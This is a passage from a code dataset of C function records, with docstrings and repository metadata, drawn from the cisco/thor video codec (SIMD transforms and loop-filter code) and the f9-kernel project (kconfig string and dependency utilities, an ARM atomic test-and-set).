v256_madd_s32(c11, t5));\n\n  t0 = v256_add_64(v256_madd_s32(c4, t9), v256_madd_s32(c8, t10));\n  t1 = v256_add_64(v256_madd_s32(c5, t9), v256_madd_s32(c9, t10));\n  t4 = v256_add_64(v256_madd_s32(c6, t9), v256_madd_s32(c10, t10));\n  t10 = v256_add_64(v256_madd_s32(c7, t9), v256_madd_s32(c11, t10));\n\n  /* Get transposed results */\n  round = v256_dup_64(1 << (19 - bitdepth));\n  load0 = v256_pack_s64_s32(v256_shr_s64(v256_add_64(v256_add_64( t8,  t5), round), shift2),\n                            v256_shr_s64(v256_add_64(v256_add_64(t13, t10), round), shift2));\n  load1 = v256_pack_s64_s32(v256_shr_s64(v256_add_64(v256_sub_64( t7,  t2), round), shift2),\n                            v256_shr_s64(v256_add_64(v256_sub_64(t16,  t0), round), shift2));\n  load2 = v256_pack_s64_s32(v256_shr_s64(v256_add_64(v256_add_64(t14, t15), round), shift2),\n                            v256_shr_s64(v256_add_64(v256_add_64(t11,  t4), round), shift2));\n  load3 = v256_pack_s64_s32(v256_shr_s64(v256_add_64(v256_sub_64( t6,  t3), round), shift2),\n                            v256_shr_s64(v256_add_64(v256_sub_64(t12,  t1), round), shift2));\n  load4 = v256_pack_s64_s32(v256_shr_s64(v256_add_64(v256_add_64( t6,  t3), round), shift2),\n                            v256_shr_s64(v256_add_64(v256_add_64(t12,  t1), round), shift2));\n  load5 = v256_pack_s64_s32(v256_shr_s64(v256_add_64(v256_sub_64(t14, t15), round), shift2),\n                            v256_shr_s64(v256_add_64(v256_sub_64(t11,  t4), round), shift2));\n  load6 = v256_pack_s64_s32(v256_shr_s64(v256_add_64(v256_add_64( t7,  t2), round), shift2),\n                            v256_shr_s64(v256_add_64(v256_add_64(t16,  t0), round), shift2));\n  load7 = v256_pack_s64_s32(v256_shr_s64(v256_add_64(v256_sub_64( t8,  t5), round), shift2),\n                            v256_shr_s64(v256_add_64(v256_sub_64(t13, t10), round), shift2));\n\n  /* Transpose */\n  t0 = v256_ziplo_32(load1, load0);\n  t1 = v256_ziplo_32(load3, load2);\n  t2 = v256_ziplo_64(t1, t0);\n  t3 = v256_ziphi_64(t1, t0);\n  t0 = v256_ziphi_32(load1, load0);\n  t1 = v256_ziphi_32(load3, load2);\n  t4 = v256_ziplo_64(t1, t0);\n  t5 = v256_ziphi_64(t1, t0);\n  t0 = v256_ziplo_32(load5, load4);\n  t1 = v256_ziplo_32(load7, load6);\n  t6 = v256_ziplo_64(t1, t0);\n  v256_store_aligned(block +  0, v256_ziplo_128(t6, t2));\n  v256_store_aligned(block +  8, v256_ziphi_128(t6, t2));\n  t7 = v256_ziphi_64(t1, t0);\n  v256_store_aligned(block + 16, v256_ziplo_128(t7, t3));\n  v256_store_aligned(block + 24, v256_ziphi_128(t7, t3));\n  t0 = v256_ziphi_32(load5, load4);\n  t1 = v256_ziphi_32(load7, load6);\n  t2 = v256_ziplo_64(t1, t0);\n  v256_store_aligned(block + 32, v256_ziplo_128(t2, t4));\n  v256_store_aligned(block + 40, v256_ziphi_128(t2, t4));\n  t3 = v256_ziphi_64(t1, t0);\n  v256_store_aligned(block + 48, v256_ziplo_128(t3, t5));\n  v256_store_aligned(block + 56, v256_ziphi_128(t3, t5));\n}", "path": "thor/common/common_kernels_gen.c", "commit_date": "2018-07-16 00:00:00", "repo_name": "cisco/thor", "stars": 693, "license": "bsd-2-clause", "language": "c", "size": 1168}
{"docstring": "/* 16x16 transform, one dimension, partial butterfly */\n", "func_signal": "static void transform16(const int32_t *src, int32_t *dst, int shift)", "code": "{\n  int j;\n  const v256 shuffle1 = v256_from_128(0x0100030205040706LL, 0x09080b0a0d0c0f0eLL);\n  const v256 shuffle2 = v256_from_128(0x0302010007060504LL, 0x0b0a09080f0e0d0cLL);\n  const v256 round = v256_dup_64(1 << (shift-1));\n\n  for (j = 0; j < 16; j += 4) {\n    v256 t0, t1, t2, t3, t4, t5, t6, t7;\n    v256 EEE0, EEE1, EEO0, EEO1;\n    v256 EE0, EE1, EE2, EE3;\n    v256 EO0, EO1, EO2, EO3;\n\n    v256 load0 = v256_load_aligned(src + 0);\n    v256 load1 = v256_pshuffle_8(v256_load_aligned(src + 8), shuffle1);\n    v256 load2 = v256_load_aligned(src + 16);\n    v256 load3 = v256_pshuffle_8(v256_load_aligned(src + 24), shuffle1);\n    v256 load4 = v256_load_aligned(src + 32);\n    v256 load5 = v256_pshuffle_8(v256_load_aligned(src + 40), shuffle1);\n    v256 load6 = v256_load_aligned(src + 48);\n    v256 load7 = v256_pshuffle_8(v256_load_aligned(src + 56), shuffle1);\n\n    /* E and O*/\n    v256 E0 = v256_add_32(load0, load1);\n    v256 O0 = v256_sub_32(load0, load1);\n    v256 E1 = v256_add_32(load2, load3);\n    v256 O1 = v256_sub_32(load2, load3);\n    v256 E2 = v256_add_32(load4, load5);\n    v256 O2 = v256_sub_32(load4, load5);\n    v256 E3 = v256_add_32(load6, load7);\n    v256 O3 = v256_sub_32(load6, load7);\n\n    /* EE and EO */\n    v256 hi = v256_unpackhi_s32_s64(E0);\n    v256 lo = v256_pshuffle_8(v256_unpacklo_s32_s64(E0), shuffle2);\n    EE0 = v256_add_64(lo, hi);\n    EO0 = v256_sub_64(lo, hi);\n    hi = v256_unpackhi_s32_s64(E1);\n    lo = v256_pshuffle_8(v256_unpacklo_s32_s64(E1), shuffle2);\n    EE1 = v256_add_64(lo, hi);\n    EO1 = v256_sub_64(lo, hi);\n    hi = v256_unpackhi_s32_s64(E2);\n    lo = v256_pshuffle_8(v256_unpacklo_s32_s64(E2), shuffle2);\n    EE2 = v256_add_64(lo, hi);\n    EO2 = v256_sub_64(lo, hi);\n    hi = v256_unpackhi_s32_s64(E3);\n    lo = v256_pshuffle_8(v256_unpacklo_s32_s64(E3), shuffle2);\n    EE3 = v256_add_64(lo, hi);\n    EO3 = v256_sub_64(lo, hi);\n\n    t0 = v256_ziphi_128(EO1, EO0);\n    t1 = v256_ziphi_128(EO3, EO2);\n    t2 = v256_ziplo_128(EO1, EO0);\n    t3 = v256_ziplo_128(EO3, EO2);\n    EO0 = v256_unziphi_64(t1, t0);\n    EO1 = v256_unziplo_64(t1, t0);\n    EO2 = v256_unziphi_64(t3, t2);\n    EO3 = v256_unziplo_64(t3, t2);\n\n    /* EEE and EEO */\n    t0 = v256_ziphi_128(EE1, EE0);\n    t1 = v256_ziphi_128(EE3, EE2);\n    t2 = v256_ziplo_128(EE1, EE0);\n    t3 = v256_ziplo_128(EE3, EE2);\n    t4 = v256_unziphi_64(t1, t0);\n    t5 = v256_unziplo_64(t3, t2);\n    t6 = v256_unziplo_64(t1, t0);\n    t7 = v256_unziphi_64(t3, t2);\n\n    EEE0 = v256_add_64(t4, t5);\n    EEE1 = v256_add_64(t6, t7);\n    EEO0 = v256_sub_64(t4, t5);\n    EEO1 = v256_sub_64(t6, t7);\n\n    /* EEEE and EEEO */\n    t0 = v256_shr_s64(v256_add_64(v256_shl_n_64(v256_add_64(EEE0, EEE1), 6), round), shift);\n    v128_store_aligned(dst, v256_low_v128(v256_unziplo_32(t0, t0)));\n    t0 = v256_shr_s64(v256_add_64(v256_shl_n_64(v256_sub_64(EEE0, EEE1), 6), round), shift);\n    v128_store_aligned(dst+8*16, v256_low_v128(v256_unziplo_32(t0, t0)));\n\n    /* */\n    t0 = v256_shr_s64(v256_add_64(v256_add_64(v256_mullo_s64(EEO0, v256_dup_64(83)),\n                                              v256_mullo_s64(EEO1, v256_dup_64(36))), round), shift);\n    v128_store_aligned(dst+4*16, v256_low_v128(v256_unziplo_32(t0, t0)));\n    t0 = v256_shr_s64(v256_add_64(v256_add_64(v256_mullo_s64(EEO0, v256_dup_64(36)),\n                                              v256_mullo_s64(EEO1, v256_dup_64(-83))), round), shift);\n    v128_store_aligned(dst+12*16, v256_low_v128(v256_unziplo_32(t0, t0)));\n\n    t0 = v256_shr_s64(v256_add_64(v256_add_64(v256_add_64(v256_mullo_s64(EO0, v256_dup_64(89)),\n                                                          v256_mullo_s64(EO1, v256_dup_64(75))),\n                                              v256_add_64(v256_mullo_s64(EO2, v256_dup_64(50)),\n                                                          v256_mullo_s64(EO3, v256_dup_64(18)))), round), shift);\n    v128_store_aligned(dst+2*16, v256_low_v128(v256_unziplo_32(t0, t0)));\n\n    t0 = v256_shr_s64(v256_add_64(v256_add_64(v256_add_64(v256_mullo_s64(EO0, v256_dup_64(75)),\n                                                          v256_mullo_s64(EO1, v256_dup_64(-18))),\n                                              v256_add_64(v256_mullo_s64(EO2, v256_dup_64(-89)),\n                                                          v256_mullo_s64(EO3, v256_dup_64(-50)))), round), shift);\n    v128_store_aligned(dst+6*16, v256_low_v128(v256_unziplo_32(t0, t0)));\n\n    t0 = v256_shr_s64(v256_add_64(v256_add_64(v256_add_64(v256_mullo_s64(EO0, v256_dup_64(50)),\n                                                          v256_mullo_s64(EO1, v256_dup_64(-89))),\n                                              v256_add_64(v256_mullo_s64(EO2, v256_dup_64(18)),\n                                                          v256_mullo_s64(EO3, v256_dup_64(75)))), round), shift);\n    v128_store_aligned(dst+10*16, v256_low_v128(v256_unziplo_32(t0, t0)));\n\n    t0 = v256_shr_s64(v256_add_64(v256_add_64(v256_add_64(v256_mullo_s64(EO0, v256_dup_64(18)),\n                                                          v256_mullo_s64(EO1, v256_dup_64(-50))),\n                                              v256_add_64(v256_mullo_s64(EO2, v256_dup_64(75)),\n                                                          v256_mullo_s64(EO3, v256_dup_64(-89)))), round), shift);\n    v128_store_aligned(dst+14*16, v256_low_v128(v256_unziplo_32(t0, t0)));\n\n    t0 = v256_from_128(0x00090019002b0039LL, 0x004600500057005aLL);\n    t0 = v256_shr_s64(v256_add_64(v256_from_v64((int32_t)v256_dotp_s32(O3, t0),\n                                               (int32_t)v256_dotp_s32(O2, t0),\n                                               (int32_t)v256_dotp_s32(O1, t0),\n                                               (int32_t)v256_dotp_s32(O0, t0)), round), shift);\n    v128_store_aligned(dst+1*16, v256_low_v128(v256_unziplo_32(t0, t0)));\n\n    t0 = v256_from_128(0xffe7ffbaffa6ffb0LL, 0xffd5000900390057LL);\n    t0 = v256_shr_s64(v256_add_64(v256_from_v64((int32_t)v256_dotp_s32(O3, t0),\n                                               (int32_t)v256_dotp_s32(O2, t0),\n                                               (int32_t)v256_dotp_s32(O1, t0),\n                                               (int32_t)v256_dotp_s32(O0, t0)), round), shift);\n    v128_store_aligned(dst+3*16, v256_low_v128(v256_unziplo_32(t0, t0)));\n\n    t0 = v256_from_128(0x002b005a0039ffe7LL, 0xffa9ffba00090050LL);\n    t0 = v256_shr_s64(v256_add_64(v256_from_v64((int32_t)v256_dotp_s32(O3, t0),\n                                               (int32_t)v256_dotp_s32(O2, t0),\n                                               (int32_t)v256_dotp_s32(O1, t0),\n                                               (int32_t)v256_dotp_s32(O0, t0)), round), shift);\n    v128_store_aligned(dst+5*16, v256_low_v128(v256_unziplo_32(t0, t0)));\n\n    t0 = v256_from_128(0xffc7ffb00019005aLL, 0x0009ffa9ffd50046LL);\n    t0 = v256_shr_s64(v256_add_64(v256_from_v64((int32_t)v256_dotp_s32(O3, t0),\n                                               (int32_t)v256_dotp_s32(O2, t0),\n                                               (int32_t)v256_dotp_s32(O1, t0),\n                                               (int32_t)v256_dotp_s32(O0, t0)), round), shift);\n    v128_store_aligned(dst+7*16, v256_low_v128(v256_unziplo_32(t0, t0)));\n\n    t0 = v256_from_128(0x0046002bffa9fff7LL, 0x005affe7ffb00039LL);\n    t0 = v256_shr_s64(v256_add_64(v256_from_v64((int32_t)v256_dotp_s32(O3, t0),\n                                               (int32_t)v256_dotp_s32(O2, t0),\n                                               (int32_t)v256_dotp_s32(O1, t0),\n                                               (int32_t)v256_dotp_s32(O0, t0)), round), shift);\n    v128_store_aligned(dst+9*16, v256_low_v128(v256_unziplo_32(t0, t0)));\n\n    t0 = v256_from_128(0xffb000090046ffa9LL, 0x00190039ffa6002bLL);\n    t0 = v256_shr_s64(v256_add_64(v256_from_v64((int32_t)v256_dotp_s32(O3, t0),\n                                               (int32_t)v256_dotp_s32(O2, t0),\n                                               (int32_t)v256_dotp_s32(O1, t0),\n                                               (int32_t)v256_dotp_s32(O0, t0)), round), shift);\n    v128_store_aligned(dst+11*16, v256_low_v128(v256_unziplo_32(t0, t0)));\n\n    t0 = v256_from_128(0x0057ffc70009002bLL, 0xffb0005affba0019LL);\n    t0 = v256_shr_s64(v256_add_64(v256_from_v64((int32_t)v256_dotp_s32(O3, t0),\n                                               (int32_t)v256_dotp_s32(O2, t0),\n                                               (int32_t)v256_dotp_s32(O1, t0),\n                                               (int32_t)v256_dotp_s32(O0, t0)), round), shift);\n    v128_store_aligned(dst+13*16, v256_low_v128(v256_unziplo_32(t0, t0)));\n\n    t0 = v256_from_128(0xffa60057ffb00046LL, 0xffc7002bffe70009LL);\n    t0 = v256_shr_s64(v256_add_64(v256_from_v64((int32_t)v256_dotp_s32(O3, t0),\n                                               (int32_t)v256_dotp_s32(O2, t0),\n                                               (int32_t)v256_dotp_s32(O1, t0),\n                                               (int32_t)v256_dotp_s32(O0, t0)), round), shift);\n    v128_store_aligned(dst+15*16, v256_low_v128(v256_unziplo_32(t0, t0)));\n\n    src += 16*4;\n    dst += 4;\n  }\n}", "path": "thor/common/common_kernels_gen.c", "commit_date": "2018-07-16 00:00:00", "repo_name": "cisco/thor", "stars": 693, "license": "bsd-2-clause", "language": "c", "size": 1168}
{"docstring": "/* Check whether coeffs are DC only, 4x4, 8x8 or larger. */\n", "func_signal": "int check_nz_area(const int32_t *coeff, int size)", "code": "{\n  uint64_t *c64 = (uint64_t *)coeff;\n  int other3, rest;\n  int dc_only4 = !((c64[0] >> 16) | c64[size / 4] | c64[size / 2] | c64[size * 3 / 4]);\n\n  if (size == 4)\n    return dc_only4 ? COEFF_DC_ONLY : COEFF_ALL;\n  other3 = !(c64[1] | c64[size / 4 + 1] | c64[size / 2 + 1] | c64[size * 3 / 4 + 1] |\n             c64[size] | c64[size + 1] | c64[size * 5 / 4] | c64[size * 5 / 4 + 1] |\n             c64[size * 3 / 2] | c64[size * 3 / 2 + 1] | c64[size * 7 / 4] | c64[size * 7 / 4 + 1]);\n  if (size == 8)\n    return dc_only4 && other3 ? COEFF_DC_ONLY : (other3 ? COEFF_4x4_ONLY : COEFF_8x8_ONLY);\n  /* The test should be in quant/dequant instead */\n  rest = !(c64[2+size/4*0] | c64[3+size/4*0] |\n           c64[2+size/4*1] | c64[3+size/4*1] |\n           c64[2+size/4*2] | c64[3+size/4*2] |\n           c64[2+size/4*3] | c64[3+size/4*3] |\n           c64[2+size/4*4] | c64[3+size/4*4] |\n           c64[2+size/4*5] | c64[3+size/4*5] |\n           c64[2+size/4*6] | c64[3+size/4*6] |\n           c64[2+size/4*7] | c64[3+size/4*7] |\n           c64[0+size/4*8] | c64[1+size/4*8] | c64[2+size/4*8] | c64[3+size/4*8] |\n           c64[0+size/4*9] | c64[1+size/4*9] | c64[2+size/4*9] | c64[3+size/4*9] |\n           c64[0+size/4*10] | c64[1+size/4*10] | c64[2+size/4*10] | c64[3+size/4*10] |\n           c64[0+size/4*11] | c64[1+size/4*11] | c64[2+size/4*11] | c64[3+size/4*11] |\n           c64[0+size/4*12] | c64[1+size/4*12] | c64[2+size/4*12] | c64[3+size/4*12] |\n           c64[0+size/4*13] | c64[1+size/4*13] | c64[2+size/4*13] | c64[3+size/4*13] |\n           c64[0+size/4*14] | c64[1+size/4*14] | c64[2+size/4*14] | c64[3+size/4*14] |\n           c64[0+size/4*15] | c64[1+size/4*15] | c64[2+size/4*15] | c64[3+size/4*15]);\n  return dc_only4 && other3 && rest ? COEFF_DC_ONLY :\n    (other3 && rest ? COEFF_4x4_ONLY : (rest ? COEFF_8x8_ONLY : COEFF_ALL));\n}", "path": "thor/common/common_kernels_gen.c", "commit_date": "2018-07-16 00:00:00", "repo_name": "cisco/thor", "stars": 693, "license": "bsd-2-clause", "language": "c", "size": 1168}
{"docstring": "// sign(a - b) * max(0, abs(a - b) - max(0, abs(a - b) -\n// strength + (abs(a - b) >> (dmp - log2(s)))))\n", "func_signal": "SIMD_INLINE v256 constrain(v256 a, v256 b, unsigned int strength, unsigned int dmp)", "code": "{\n#ifdef HBD\n  const v256 diff = v256_sub_16(v256_max_s16(a, b), v256_min_s16(a, b));\n  const v256 sign = v256_cmpeq_16(v256_min_s16(a, b), a);  // -(a <= b)\n  const v256 zero = v256_zero();\n  const v256 s = v256_max_s16(zero, v256_sub_16(v256_dup_16(strength), v256_shr_u16(diff, dmp - log2i(strength))));\n  return v256_sub_16(v256_xor(sign, v256_max_s16(zero, v256_sub_16(diff, v256_max_s16(zero, v256_sub_16(diff, s))))), sign);\n#else\n  const v256 diff = v256_sub_16(v256_max_u16(a, b), v256_min_u16(a, b));\n  const v256 sign = v256_cmpeq_16(v256_min_u16(a, b), a);  // -(a <= b)\n  const v256 s = v256_ssub_u16(v256_dup_16(strength), v256_shr_u16(diff, dmp - log2i(strength)));\n  return v256_sub_16(v256_xor(sign, v256_ssub_u16(diff, v256_ssub_u16(diff, s))), sign);\n#endif\n}", "path": "thor/common/common_kernels_gen.c", "commit_date": "2018-07-16 00:00:00", "repo_name": "cisco/thor", "stars": 693, "license": "bsd-2-clause", "language": "c", "size": 1168}
{"docstring": "// Calculate the square error of all filter settings.  Result:\n// res[0][0]   : unfiltered\n// res[0][1-3] : strength=1,2,4, no signals\n// (Only for luma:)\n// res[1][0]   : (bit count, fb size = 128)\n// res[1][1-3] : strength=1,2,4, fb size = 128\n// res[2][0]   : (bit count, fb size = 64)\n// res[2][1-3] : strength=1,2,4, fb size = 64\n// res[3][0]   : (bit count, fb size = 32)\n// res[3][1-3] : strength=1,2,4, fb size = 32\n", "func_signal": "static int clpf_rdo(int y, int x, yuv_frame_t *rec, yuv_frame_t *org, const deblock_data_t *deblock_data, unsigned int block_size, unsigned int fb_size_log2, int w, int h, int64_t res[4][4], int bitdepth, plane_t plane, int qp)", "code": "{\n  int filtered = 0;\n  int sum[4];\n  int bslog = log2i(block_size);\n  int damping = bitdepth - 4 - (plane != PLANE_Y) + (qp >> 4);\n\n  sum[0] = sum[1] = sum[2] = sum[3] = 0;\n  if (plane == PLANE_Y && fb_size_log2 > log2i(MAX_SB_SIZE) - 3) {\n    fb_size_log2--;\n    int w1 = min(1<<(fb_size_log2-bslog), w);\n    int h1 = min(1<<(fb_size_log2-bslog), h);\n    int w2 = min(w - (1<<(fb_size_log2-bslog)), w>>1);\n    int h2 = min(h - (1<<(fb_size_log2-bslog)), h>>1);\n    int i = log2i(MAX_SB_SIZE) - fb_size_log2;\n    int64_t sum1 = res[i][1], sum2 = res[i][2], sum3 = res[i][3];\n    int64_t oldfiltered = res[i][0];\n    res[i][0] = 0;\n\n    filtered = clpf_rdo(y, x, rec, org, deblock_data, block_size, fb_size_log2, w1, h1, res, bitdepth, plane, qp);\n    if (1<<(fb_size_log2-bslog) < w)\n      filtered |= clpf_rdo(y, x+(1<<fb_size_log2), rec, org, deblock_data, block_size, fb_size_log2, w2, h1, res, bitdepth, plane, qp);\n    if (1<<(fb_size_log2-bslog) < h) {\n      filtered |= clpf_rdo(y+(1<<fb_size_log2), x, rec, org, deblock_data, block_size, fb_size_log2, w1, h2, res, bitdepth, plane, qp);\n      filtered |= clpf_rdo(y+(1<<fb_size_log2), x+(1<<fb_size_log2), rec, org, deblock_data, block_size, fb_size_log2, w2, h2, res, bitdepth, plane, qp);\n    }\n\n    res[i][1] = min(sum1 + res[i][0], res[i][1]);\n    res[i][2] = min(sum2 + res[i][0], res[i][2]);\n    res[i][3] = min(sum3 + res[i][0], res[i][3]);\n    res[i][0] = oldfiltered + filtered; // Number of signal bits\n    return filtered;\n  }\n\n  SAMPLE *rec_buffer = plane != PLANE_Y ? (plane == PLANE_U ? rec->u : rec->v) : rec->y;\n  SAMPLE *org_buffer = plane != PLANE_Y ? (plane == PLANE_U ? org->u : org->v) : org->y;\n  int rec_width = plane != PLANE_Y ? (rec->width >> rec->sub) : rec->width;\n  int rec_height = plane != PLANE_Y ? (rec->height >> rec->sub) : rec->height;\n  int rec_stride = plane != PLANE_Y ? rec->stride_c : rec->stride_y;\n  int org_stride = plane != PLANE_Y ? org->stride_c : org->stride_y;\n\n  for (int m = 0; m < h; m++) {\n    for (int n = 0; n < w; n++) {\n      int xpos = x + n*block_size;\n      int ypos = y + m*block_size;\n      int sub = plane != PLANE_Y && org->sub;\n      int index = ((ypos << sub) / MIN_PB_SIZE)*(rec->width / MIN_PB_SIZE) + ((xpos << sub) / MIN_PB_SIZE);\n      if (deblock_data[index].mode != MODE_SKIP) {\n        if (use_simd && block_size == 8)\n          TEMPLATE(detect_multi_clpf_simd)(rec_buffer, org_buffer, xpos, ypos, rec_width, rec_height, org_stride, rec_stride, sum, bitdepth - 8, block_size, damping);\n        else\n          TEMPLATE(detect_multi_clpf)(rec_buffer, org_buffer, xpos, ypos, rec_width, rec_height, org_stride, rec_stride, sum, bitdepth - 8, block_size, damping);\n        filtered = 1;\n      }\n    }\n  }\n\n  for (int i = 0; i < (plane == PLANE_Y ? 4 : 1); i++) {\n    res[i][0] += sum[0];\n    res[i][1] += sum[1];\n    res[i][2] += sum[2];\n    res[i][3] += sum[3];\n  }\n  return filtered;\n}", "path": "thor/enc/encode_frame.c", "commit_date": "2018-01-17 00:00:00", "repo_name": "cisco/thor", "stars": 693, "license": "bsd-2-clause", "language": "c", "size": 1168}
{"docstring": "// delta = 1/16 * constrain(a, x, s) + 3/16 * constrain(b, x, s) +\n//         1/16 * constrain(c, x, s) + 3/16 * constrain(d, x, s) +\n//         3/16 * constrain(e, x, s) + 1/16 * constrain(f, x, s) +\n//         3/16 * constrain(g, x, s) + 1/16 * constrain(h, x, s)\n", "func_signal": "SIMD_INLINE v256 calc_delta(v256 x, v256 a, v256 b, v256 c, v256 d, v256 e,\n                            v256 f, v256 g, v256 h, unsigned int s,\n                            unsigned int dmp)", "code": "{\n  const v256 bdeg =\n      v256_add_16(v256_add_16(constrain(b, x, s, dmp), constrain(d, x, s, dmp)),\n                 v256_add_16(constrain(e, x, s, dmp), constrain(g, x, s, dmp)));\n  const v256 delta = v256_add_16(\n      v256_add_16(v256_add_16(constrain(a, x, s, dmp), constrain(c, x, s, dmp)),\n                 v256_add_16(constrain(f, x, s, dmp), constrain(h, x, s, dmp))),\n      v256_add_16(v256_add_16(bdeg, bdeg), bdeg));\n  return v256_add_16(x, v256_shr_s16(v256_add_16(v256_dup_16(8), v256_add_16(delta, v256_cmplt_s16(delta, v256_zero()))), 4));\n}", "path": "thor/common/common_kernels_gen.c", "commit_date": "2018-07-16 00:00:00", "repo_name": "cisco/thor", "stars": 693, "license": "bsd-2-clause", "language": "c", "size": 1168}
{"docstring": "// sign(a-b) * min(abs(a-b), max(0, threshold - (abs(a-b) >> adjdamp)))\n", "func_signal": "SIMD_INLINE v256 constrain16(v256 a, v256 b, unsigned int threshold,\n                             unsigned int adjdamp)", "code": "{\n  v256 diff = v256_sub_32(a, b);\n  const v256 sign = v256_shr_n_s32(diff, 15);\n  diff = v256_abs_s32(diff);\n  const v256 s =\n      v128_ssub_u16(v256_dup_32(threshold), v256_shr_u32(diff, adjdamp));\n  return v256_xor(v256_add_32(sign, v256_min_s32(diff, s)), sign);\n}", "path": "thor/common/common_kernels_gen.c", "commit_date": "2018-07-16 00:00:00", "repo_name": "cisco/thor", "stars": 693, "license": "bsd-2-clause", "language": "c", "size": 1168}
{"docstring": "/* Append printf formatted string to growable string */\n", "func_signal": "void str_printf(struct gstr *gs, const char *fmt, ...)", "code": "{\n\tva_list ap;\n\tchar s[10000]; /* big enough... */\n\tva_start(ap, fmt);\n\tvsnprintf(s, sizeof(s), fmt, ap);\n\tstr_append(gs, s);\n\tva_end(ap);\n}", "path": "f9-kernel/external/kconfig/util.c", "commit_date": "2014-02-11 00:00:00", "repo_name": "f9micro/f9-kernel", "stars": 673, "license": "other", "language": "c", "size": 1205}
{"docstring": "/* CONFIG_SMP */\n", "func_signal": "uint32_t test_and_set_word(uint32_t *word)", "code": "{\n\tregister int result = 1;\n\n\t__asm__ __volatile__(\n\t    \"mov r1, #1\\n\"\n\t    \"mov r2, %[word]\\n\"\n\t    \"ldrex r0, [r2]\\n\"\t/* Load value [r2] */\n\t    \"cmp r0, #0\\n\"\t/* Checking is word set to 1 */\n\n\t    \"itt eq\\n\"\n\t    \"strexeq r0, r1, [r2]\\n\"\n\t    \"moveq %[result], r0\\n\"\n\t    : [result] \"=r\"(result)\n\t    : [word] \"r\"(word)\n\t    : \"r0\", \"r1\", \"r2\");\n\n\treturn result == 0;\n}", "path": "f9-kernel/platform/bitops.c", "commit_date": "2014-01-29 00:00:00", "repo_name": "f9micro/f9-kernel", "stars": 673, "license": "other", "language": "c", "size": 1205}
{"docstring": "/*\n * Called when we have detected a recursive dependency.\n * check_top point to the top of the stact so we use\n * the ->prev pointer to locate the bottom of the stack.\n */\n", "func_signal": "static void sym_check_print_recursive(struct symbol *last_sym)", "code": "{\n\tstruct dep_stack *stack;\n\tstruct symbol *sym, *next_sym;\n\tstruct menu *menu = NULL;\n\tstruct property *prop;\n\tstruct dep_stack cv_stack;\n\n\tif (sym_is_choice_value(last_sym)) {\n\t\tdep_stack_insert(&cv_stack, last_sym);\n\t\tlast_sym = prop_get_symbol(sym_get_choice_prop(last_sym));\n\t}\n\n\tfor (stack = check_top; stack != NULL; stack = stack->prev)\n\t\tif (stack->sym == last_sym)\n\t\t\tbreak;\n\tif (!stack) {\n\t\tfprintf(stderr, \"unexpected recursive dependency error\\n\");\n\t\treturn;\n\t}\n\n\tfor (; stack; stack = stack->next) {\n\t\tsym = stack->sym;\n\t\tnext_sym = stack->next ? stack->next->sym : last_sym;\n\t\tprop = stack->prop;\n\t\tif (prop == NULL)\n\t\t\tprop = stack->sym->prop;\n\n\t\t/* for choice values find the menu entry (used below) */\n\t\tif (sym_is_choice(sym) || sym_is_choice_value(sym)) {\n\t\t\tfor (prop = sym->prop; prop; prop = prop->next) {\n\t\t\t\tmenu = prop->menu;\n\t\t\t\tif (prop->menu)\n\t\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t\tif (stack->sym == last_sym)\n\t\t\tfprintf(stderr, \"%s:%d:error: recursive dependency detected!\\n\",\n\t\t\t\tprop->file->name, prop->lineno);\n\t\tif (stack->expr) {\n\t\t\tfprintf(stderr, \"%s:%d:\\tsymbol %s %s value contains %s\\n\",\n\t\t\t\tprop->file->name, prop->lineno,\n\t\t\t\tsym->name ? sym->name : \"<choice>\",\n\t\t\t\tprop_get_type_name(prop->type),\n\t\t\t\tnext_sym->name ? next_sym->name : \"<choice>\");\n\t\t} else if (stack->prop) {\n\t\t\tfprintf(stderr, \"%s:%d:\\tsymbol %s depends on %s\\n\",\n\t\t\t\tprop->file->name, prop->lineno,\n\t\t\t\tsym->name ? sym->name : \"<choice>\",\n\t\t\t\tnext_sym->name ? next_sym->name : \"<choice>\");\n\t\t} else if (sym_is_choice(sym)) {\n\t\t\tfprintf(stderr, \"%s:%d:\\tchoice %s contains symbol %s\\n\",\n\t\t\t\tmenu->file->name, menu->lineno,\n\t\t\t\tsym->name ? sym->name : \"<choice>\",\n\t\t\t\tnext_sym->name ? next_sym->name : \"<choice>\");\n\t\t} else if (sym_is_choice_value(sym)) {\n\t\t\tfprintf(stderr, \"%s:%d:\\tsymbol %s is part of choice %s\\n\",\n\t\t\t\tmenu->file->name, menu->lineno,\n\t\t\t\tsym->name ? sym->name : \"<choice>\",\n\t\t\t\tnext_sym->name ? next_sym->name : \"<choice>\");\n\t\t} else {\n\t\t\tfprintf(stderr, \"%s:%d:\\tsymbol %s is selected by %s\\n\",\n\t\t\t\tprop->file->name, prop->lineno,\n\t\t\t\tsym->name ? sym->name : \"<choice>\",\n\t\t\t\tnext_sym->name ? next_sym->name : \"<choice>\");\n\t\t}\n\t}\n\n\tif (check_top == &cv_stack)\n\t\tdep_stack_remove();\n}", "path": "f9-kernel/external/kconfig/symbol.c", "commit_date": "2013-08-09 00:00:00", "repo_name": "f9micro/f9-kernel", "stars": 673, "license": "other", "language": "c", "size": 1205}
{"docstring": "/* Allocate and assign growable string */\n", "func_signal": "struct gstr str_assign(const char *s)", "code": "{\n\tstruct gstr gs;\n\tgs.s = strdup(s);\n\tgs.len = strlen(s) + 1;\n\tgs.max_width = 0;\n\treturn gs;\n}", "path": "f9-kernel/external/kconfig/util.c", "commit_date": "2014-02-11 00:00:00", "repo_name": "f9micro/f9-kernel", "stars": 673, "license": "other", "language": "c", "size": 1205}
{"docstring": "/* Append to growable string */\n", "func_signal": "void str_append(struct gstr *gs, const char *s)", "code": "{\n\tsize_t l;\n\tif (s) {\n\t\tl = strlen(gs->s) + strlen(s) + 1;\n\t\tif (l > gs->len) {\n\t\t\tgs->s   = realloc(gs->s, l);\n\t\t\tgs->len = l;\n\t\t}\n\t\tstrcat(gs->s, s);\n\t}\n}", "path": "f9-kernel/external/kconfig/util.c", "commit_date": "2014-02-11 00:00:00", "repo_name": "f9micro/f9-kernel", "stars": 673, "license": "other", "language": "c", "size": 1205}
